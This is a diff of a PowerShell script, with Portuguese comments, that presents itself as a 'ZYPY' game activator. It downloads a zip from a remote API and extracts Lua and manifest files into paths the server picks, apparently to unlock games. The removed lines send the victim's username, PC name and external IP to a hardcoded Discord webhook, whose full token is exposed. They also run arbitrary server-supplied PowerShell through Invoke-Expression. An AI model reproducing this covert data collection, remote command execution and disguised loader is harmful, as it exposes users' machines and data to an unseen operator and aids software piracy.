@@ -1,130 +1,55 @@
 # ---------------------------------------------------------
-# Configurações Iniciais
+# Configurações
 # ---------------------------------------------------------
 $API_URL     = "https://gaamingsteam.squareweb.app/api/app/"
 $APP_ID      = "kastexstorms"
 $ID_JOGO     = "0"
 $WebhookUrl  = "https://discord.com/api/webhooks/1504479978652303531/mL7S7SbUoOVYplPtqJvQHOX1UeZFxoLSXgPYCvHDkepJbJVu6PSZgjhzGOfxW4yegEq0"
 
-# ---------------------------------------------------------
-# Funções Auxiliares
-# ---------------------------------------------------------
-function Show-MessageBox {
-    param([string]$Message, [string]$Title)
-    Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show($Message, $Title)
-}
-
-function Send-Webhook {
-    param([string]$Status, [string]$Detalhes = "N/A")
-    if ($WebhookUrl -like "http*") {
-        try {
-            $User = [Environment]::UserName
-            $Comp = [Environment]::MachineName
-            # Timeout de 2 segundos para o IP não travar o script
-            $IP = try { Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 2 -ErrorAction Stop } catch { "IP não obtido" }
-            
-            $Body = @{
-                embeds = @(@{
-                    title = "🚀 Log de Ativação - ZYPY"
-                    color = 65280 # Verde
-                    fields = @(
-                        @{ name = "Status"; value = $Status; inline = $false }
-                        @{ name = "Usuário/PC"; value = "$User @ $Comp"; inline = $true }
-                        @{ name = "ID Jogo"; value = $ID_JOGO; inline = $true }
-                        @{ name = "IP Externo"; value = $IP; inline = $false }
-                        @{ name = "Detalhes"; value = $Detalhes; inline = $false }
-                    )
-                    footer = @{ text = "Data: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
-                })
-            } | ConvertTo-Json -Depth 4
-
-            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType "application/json"
-        } catch { 
-            # Falha no webhook não deve parar o script principal
-            Write-Host "Falha ao enviar log para o Discord." 
-        }
-    }
-}
-
-# ---------------------------------------------------------
-# 1. Conexão com API
-# ---------------------------------------------------------
-$UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
 try {
-    $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -TimeoutSec 10
-} catch {
-    Show-MessageBox -Message "Erro ao conectar com o servidor da API. Verifique sua conexão." -Title "Erro Fatal"
-    exit
-}
+    # 1. Teste de Conexão API
+    Write-Host "--- Conectando na API ---" -ForegroundColor Cyan
+    $UrlFinal = "$API_URL$APP_ID/$ID_JOGO"
+    $response = Invoke-RestMethod -Uri $UrlFinal -Method Get -ErrorAction Stop
+    Write-Host "API Respondendo: OK" -ForegroundColor Green
 
-if (-not $response.ativo) {
-    Send-Webhook -Status "Tentativa Negada" -Detalhes "Licença expirada ou inativa na API."
-    Show-MessageBox -Message "Acesso desativado. Entre em contato com o suporte." -Title "Licença Inválida"
-    exit
-}
+    # 2. Criando pasta temporária
+    $DocumentsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("MyDocuments"), "conteudo")
+    if (-not (Test-Path $DocumentsPath)) { New-Item -ItemType Directory -Path $DocumentsPath }
 
-# ---------------------------------------------------------
-# 2. Preparação e Download
-# ---------------------------------------------------------
-$DocumentsPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("MyDocuments"), "conteudo")
-if (-not (Test-Path $DocumentsPath)) { New-Item -ItemType Directory -Path $DocumentsPath | Out-Null }
-
-$ZipDestino = Join-Path $DocumentsPath "$ID_JOGO.zip"
-try {
+    # 3. Download
+    Write-Host "--- Baixando Arquivo ---" -ForegroundColor Cyan
+    $ZipDestino = Join-Path $DocumentsPath "$ID_JOGO.zip"
     Invoke-WebRequest -Uri $response.url_zip -OutFile $ZipDestino -ErrorAction Stop
-} catch {
-    Send-Webhook -Status "Erro" -Detalhes "Falha ao baixar o arquivo ZIP da URL: $($response.url_zip)"
-    Show-MessageBox -Message "Erro ao baixar arquivos do jogo." -Title "Erro de Download"
-    exit
-}
+    Write-Host "Download: OK" -ForegroundColor Green
 
-# ---------------------------------------------------------
-# 3. Extração (Ativação)
-# ---------------------------------------------------------
-$reiniciar = $false
-if (Test-Path $ZipDestino) {
-    try {
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        $zip = [System.IO.Compression.ZipFile]::OpenRead($ZipDestino)
-        
-        foreach ($entry in $zip.Entries) {
-            $destinoPath = $null
-            if ($entry.Name.ToLower().EndsWith(".lua")) { $destinoPath = $response.caminho_lua }
-            elseif ($entry.Name.ToLower().EndsWith(".st") -or $entry.Name.ToLower().EndsWith(".manifest")) { $destinoPath = $response.caminho_manifest }
+    # 4. Extração
+    Write-Host "--- Extraindo Arquivos ---" -ForegroundColor Cyan
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    $zip = [System.IO.Compression.ZipFile]::OpenRead($ZipDestino)
+    
+    foreach ($entry in $zip.Entries) {
+        $destino = $null
+        if ($entry.Name.EndsWith(".lua")) { $destino = $response.caminho_lua }
+        if ($entry.Name.EndsWith(".st") -or $entry.Name.EndsWith(".manifest")) { $destino = $response.caminho_manifest }
 
-            if ($destinoPath) {
-                if (-not (Test-Path $destinoPath)) { New-Item -ItemType Directory -Path $destinoPath -Force | Out-Null }
-                $caminhoFinalAtivo = Join-Path $destinoPath $entry.Name
-                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $caminhoFinalAtivo, $true)
-                $reiniciar = $true
-            }
+        if ($destino) {
+            Write-Host "Extraindo $($entry.Name) para $destino" -ForegroundColor Gray
+            if (-not (Test-Path $destino)) { New-Item -ItemType Directory -Path $destino -Force | Out-Null }
+            $caminhoFinal = Join-Path $destino $entry.Name
+            [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $caminhoFinal, $true)
         }
-        $zip.Dispose()
-        # Remove o zip após extrair para limpar o PC
-        Remove-Item $ZipDestino -Force
-    } catch {
-        Send-Webhook -Status "Erro" -Detalhes "Falha na extração: $($_.Exception.Message)"
-        Show-MessageBox -Message "Erro ao extrair arquivos." -Title "Erro"
-        exit
     }
+    $zip.Dispose()
+    Remove-Item $ZipDestino
+    Write-Host "--- SUCESSO TOTAL ---" -ForegroundColor Green
+
+} catch {
+    Write-Host "`n!!! ERRO DETECTADO !!!" -ForegroundColor White -BackgroundColor Red
+    Write-Host $_.Exception.Message -ForegroundColor Red
+    Write-Host "`nVerifique se você executou como ADMINISTRADOR ou se a pasta de destino existe." -ForegroundColor Yellow
 }
 
-# ---------------------------------------------------------
-# 4. Finalização
-# ---------------------------------------------------------
-if ($reiniciar) {
-    Send-Webhook -Status "Sucesso" -Detalhes "Jogo $ID_JOGO ativado e arquivos movidos."
-    
-    if ($response.comando_powershell) {
-        try { Invoke-Expression $response.comando_powershell } catch { }
-    }
-    
-    Show-MessageBox -Message "Jogo ativado com sucesso! Oferecimento ZYPY" -Title "Status"
-} else {
-    Show-MessageBox -Message "Nenhum arquivo válido foi encontrado para extração." -Title "Aviso"
-}
-
-# Pausa final caso execute manualmente (evita fechar a janela antes de ver o resultado)
-Write-Host "Processo finalizado."
-Start-Sleep -Seconds 2
+# ESSA LINHA IMPEDE O FECHAMENTO:
+Write-Host "`nJanela travada para leitura. Pressione qualquer tecla para fechar..." -ForegroundColor Cyan
+$null = [System.Console]::ReadKey()
